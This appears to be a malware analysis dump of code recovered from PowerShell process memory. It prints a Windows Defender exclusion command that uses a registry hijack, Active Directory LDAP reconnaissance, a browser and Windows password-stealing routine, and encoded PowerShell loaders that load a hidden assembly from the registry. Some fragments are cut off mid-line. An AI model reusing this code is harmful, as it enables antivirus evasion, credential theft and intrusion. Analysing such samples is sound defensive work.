@@ -1,0 +1,129 @@
+################################################################################################
+### PowerShell and JavaScript code from PowerShell.exe process memory
+################################################################################################
+###### Analysis: Code to exclude malware from Windows Defender
+#####################################RAW DATA EXTRACT HERE######################################
+
+// ===================================== Add windef exclusion 
+// Todo: 
+// Servers - find other way to get installed AV. 
+// if user==system than add exclusion without 
+:j` * 
+// add ms essentials. 
+// hide cmd windows? hide error windows? mshta vbscript:Execute("MsgBox(""amessage"",64,""atitle"")(window.close)") 
+// find path to wmic.exe - C:\Windows\System32\wbem\WMIC.exe 
+// find path to white listed exe? 
+;J` + 
+ck for windef status - WMIC /Namespace:\\root\Microsoft\Windows\Defender Path MSFT_MpComputerStatus Get * /format:list 
+// if it fail, than windef probably disabled 
+// indexOf() is case sensitive! 
+// Don't check PUAProtection! error at win8 
+e) { 
+let marker = 'markwde316.tmp'; 
+let logPrefix = 'WDE7::'; 
+leT; 
+en\\command /f /d "cmd /c start /min WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\"' + excludeDir + '\\"" /t N; 
+& ' + whiteListExe + ' & ping -n 7 127.0.0.1 > NUL & reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f'; 
+//        logIt(cmdline); 
+        execFile(cmd, ['/c', cmdline], { 
+                timeout : 30000, 
+                windowsHide : false, 
+                windown; 
+
+################################################################################################
+###### Analysis: Active Directory reconaissance
+#####################################RAW DATA EXTRACT HERE######################################
+
+// ===================================== Domain stats 
+if(true) { 
+     
+    let marker = 'mrkglobdst1215.tmp'; 
+    let logPrefix = 'DomStats1::'; 
+    let srvLogFilePrefix = 'domstats'; 
+    let timeoutSeconds = 240; 
+     
+    function logIt(){ 
+        // 1. Convert args to a normal array 
+        var args = Array.prototype.slice.call(arguments); 
+             
+        // 2. Prepend log prefix log string 
+        args.unshift(logPrefix); 
+             
+        // 3. Pass along arguments to console.log 
+            process.log.apply(console, args); 
+    //        console.log.apply(console, args); 
+    } 
+     
+     
+     
+    function UploadResultsToServer(data){ 
+     
+                    let fs = require('fs'); 
+                    let uploader = require('uploader');                                                                 
+                             
+                            uploader.uploadLogFile2(data, {fileprefix : srvLogFilePrefix}); 
+    } 
+
+################################################################################################
+###### Analysis: Performed LDAP queries
+#####################################RAW DATA EXTRACT HERE######################################
+
+$i=0; $str = '(&(objectcategory=person)(objectclass=user))';$s = [adsisearcher]$str;$s.searchRoot = $L.$D.distinguishedName;$s.PropertiesToLoad.Add('mail') > $Null;$s.PropertiesToLoad.Add('userPrincipalName') > $Null;Foreach ($CA in $s.FindAll()){;$emails += $CA.Properties.Item('mail'); $emails += $CA.Properties.Item('userPrincipalName');$i++;}; 
+  
+$i=0; $str = '(&(objectcategory=computer)(operatingSystem=*serv*)(|(lastlogon>='+$Date+')(lastlogontimestamp>='+$Date+')))';$s = [adsisearcher]$str;$s.searchRoot = $L.$D.distinguishedName;$s.PropertiesToLoad.Add('cn') > $Null;Foreach ($CA in $s.FindAll()){;$i++;}; $cntServers = $i; 
+  
+$i=0; $str = '(&(objectcategory=computer)(|(lastlogon>='+$Date+')(lastlogontimestamp>='+$Date+')))';$s = [adsisearcher]$str;$s.searchRoot = $L.$D.distinguishedName;$s.PropertiesToLoad.Add('cn') > $Null;Foreach ($CA in $s.FindAll()){;$i++;}; $cntAllMachines = $i; 
+  
+$days = -90; $D=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$L='LDAP://'.$D;$D = [ADSI]$L;$Date = $((Get-Date).AddDays($days).ToFileTime()); 
+
+################################################################################################
+###### Analysis: Password extraction routine with following modules 
+######   collectChromePackedProfile 
+######   collectChromiumCookies 
+######   collectChromiumEngineCookies 
+######   collectChromiumEngineCookiesVersion_1 
+######   collectChromiumEngineCookiesVersion_2 
+######   collectChromiumEnginePassword 
+######   collectChromiumEngineProfile 
+######   collectCromePasswords 
+######   collectFireFoxCookies 
+######   collectFirefoxPasswords 
+######   collectIeCookies 
+######   collectNSSEnginePassword 
+######   collectResponseCookies 
+######   collectWindowsPasswords 
+#####################################RAW DATA EXTRACT HERE######################################
+
+setTimeout(function(){ 
+let pathMarker = path.join(os.tmpDir(), ('\\markgp1841.tmp')); 
+ 
+        if (!fs.existsSync(pathMarker)) { 
+                // Do something 
+                fs.writeFileSync(pathMarker, '1'); 
+ 
+ 
+                        process.log('Grab PP ' + Math.random()); 
+                         
+                        process.collectSavedPasswords(); 
+                         
+                        let saved_creds = require('saved_creds'); 
+                        if(saved_creds.grabPasswordsPony){ 
+                                saved_creds.grabPasswordsPony(); 
+                        } 
+        } 
+}, 370000); 
+
+
+################################################################################################
+###### Executed Powershell Code
+#####################################RAW DATA EXTRACT HERE######################################
+"powershell.exe" -Win Hi -Command "$r = [Environment]::GetEnvironmentVariable('<username>', 'User').split();$p=$r[0];$r[0]='';Start-Process $p -ArgumentList ($r -join ' ') -Win Hi"
+
+"powershell.exe"          -windowstyle hidden  -En "PAAjACAAeQBwAHUAbABzAGQAYQBzAHIAIAAjAD4AJAB1AD0AJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAA3ADAAMAA7ACQAaQArACsAKQB7ACQAYwA9ACIASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAIgArACQAdQArACIAMQAiADsAVAByAHkAewAkAGEAPQAkAGEAKwAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAHAAYQB0AGgAIAAkAGMAKQAuACQAaQB9AEMAYQB0sAGMAaAB7AH0AfQA7AGYAdQBuAGMAdABpAG8AbgAgAGMAaABiAGEAewBbAGMAbQBkAGwAZQB0AGIAaQBuAGQAaQBuAGcAKAApAF0AcABhAHIAYQBtACgAWwBwAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACkAXQBbAFMAdAByAGkAbgBnAF0AJABoAHMAKQA7ACQAQgB5AHQAZQBzACAAPQAgAFsAYgB5AHQAZQBbAF0AXQA6ADoAbgBlAHcAKAAkAGgAcwAuAEwAZQBuAGcAdABoACAALwAgADIAKQA7AGYAbwByACgAJABpAD0AMAA7ACAAJABpACAALQBsAHQAIAAkAGgAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwA9ADIAKQB7ACQAQgB5AHQAZQBzAFsAJABpAC8AMgBdACAAPQAgAFsAYwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgB5AHQAZQAoACQAaABzAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAkAGkALAAgADIAKQAsACAAMQA2ACkAfQAkAEIAeQB0AGUAcwB9ADsAJABpACAAPQAgADAAOwBXAGgAaQBsAGUAIAAoACQAVAByAHUAZQApAHsAJABpACsAKwA7ACQAawBvACAAPQAgAFsAbQBhAHQAaABdADoAOgBTAHEAcgB0ACgAJABpACkAOwBpAGYAIAAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewAgAGIAcgBlAGEAawB9AH0AWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIABjAGgAYgBhACgAJABhAC4AcgBlAHAAbABhAGMAZQAoACIAIwAiACwAJABrAG8AKQApADsAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AFsATQBvAGQAZQBdADoAOgBTAGUAdAB1AHAAKAApADsA " 
+
+<# ypulsdasr #>$u=$env:UserName;for ($i=0;$i -le 700;$i++){$c="HKCU:\SOFTWARE\"+$u+"1";Try{$a=$a+(Get-ItemProperty -path $c).$i}Catch{}};function chba{[cmdletbinding()]param([parameter(Mandatory=$true)][String]$hs);$Bytes = [byte[]]::new($hs.Length / 2);for($i=0; $i -lt $hs.Length; $i+=2){$Bytes[$i/2] = [convert]::ToByte($hs.Substring($i, 2), 16)}$Bytes};$i = 0;While ($True){$i++;$ko = [math]::Sqrt($i);if ($ko -eq 1000){ break}}[byte[]]$b = chba($a.replace("#",$ko));[Reflection.Assembly]::Load($b);[Mode]::Setup();
+
+
+"powershell.exe"   -windowstyle hidden  -En "PAAjACAAZQBkAGwAcQBlAG0AaQAgACMAPgAkAHUAPQAkAGUAbgB2ADoAVQBzAGUAcgBOAGEAbQBlADsAZgBvAHIAIAAoACQAaQA9ADAAOwAkAGkAIAAtAGwAZQAgADcAMAAwADsAJABpACsAKwApAHsAJABjAD0AIgBIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXAAiACsAJAB1ACsAIgAxACIAOwBUAHIAeQB7ACQAYQA9ACQAYQArACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACQAYwApAC4AJABpAH0AQwBhAHQAYwBoAHsAfQB9ADsAZgB1AG4AYwB0AGkAbwBuACAAYwBoAGIAYQB7AFsAYwBtAGQAbABlAHQAYgBpAG4AZABpAG4AZwAoACkAXQBwAGEAcgBhAG0AKABbAHAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAPQAkAHQAcgB1AGUAKQBdAFsAUwB0AHIAaQBuAGcAXQAkAGgAcwApADsAJABCAHkAdABlAHMAIAA9ACAAWwBiAHkAdABlAFsAXQBdADoAOgBuAGUAdwAoACQAaABzAC4ATABlAG4AZwB0AGgAIAAvACAAMgApADsAZgBvAHIAKAAkAGkAPQAwADsAIAAkAGkAIAAtAGwAdAAgACQAaABzAC4ATABlAG4AZwB0AGgAOwAgACQAaQArAD0AMgApAHsAJABCAHkAdABlAHMAWwAkAGkALwAyAF0AIAA9ACAAWwBjAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAHkAdABlACgAJABoAHMALgBTAHUAYgBzAHQAcgBpAG4AZwAoACQAaQAsACAAMgApACwAIAAxADYAKQB9ACQAQgB5AHQAZQBzAH0AOwAkAGkAIAA9ACAAMAA7AFcAaABpAGwAZQAgACgAJABUAHIAdQBlACkAewAkAGkAKwArADsAJABrAG8AIAA9ACAAWwBtAGEAdABoAF0AOgA6AFMAcQByAHQAKAAkAGkAKQA7AGkAZgAgACgAJABrAG8AIAAtAGUAcQAgADEAMAAwADAAKQB7ACAAYgByAGUAYQBrAH0AfQBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgAGMAaABiAGEAKAAkAGEALgByAGUAcABsAGEAYwBlACgAIgAjACIALAAkAGsAbwApACkAOwBbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACQAYgApADsAWwBNAG8AZABlAF0AOgA6AFMAZQB0AHUAcAAoACkAOwA= "  
+
+<# edlqemi #>$u=$env:UserName;for ($i=0;$i -le 700;$i++){$c="HKCU:\SOFTWARE\"+$u+"1";Try{$a=$a+(Get-ItemProperty -path $c).$i}Catch{}};function chba{[cmdletbinding()]param([parameter(Mandatory=$true)][String]$hs);$Bytes = [byte[]]::new($hs.Length / 2);for($i=0; $i -lt $hs.Length; $i+=2){$Bytes[$i/2] = [convert]::ToByte($hs.Substring($i, 2), 16)}$Bytes};$i = 0;While ($True){$i++;$ko = [math]::Sqrt($i);if ($ko -eq 1000){ break}}[byte[]]$b = chba($a.replace("#",$ko));[Reflection.Assembly]::Load($b);[Mode]::Setup();
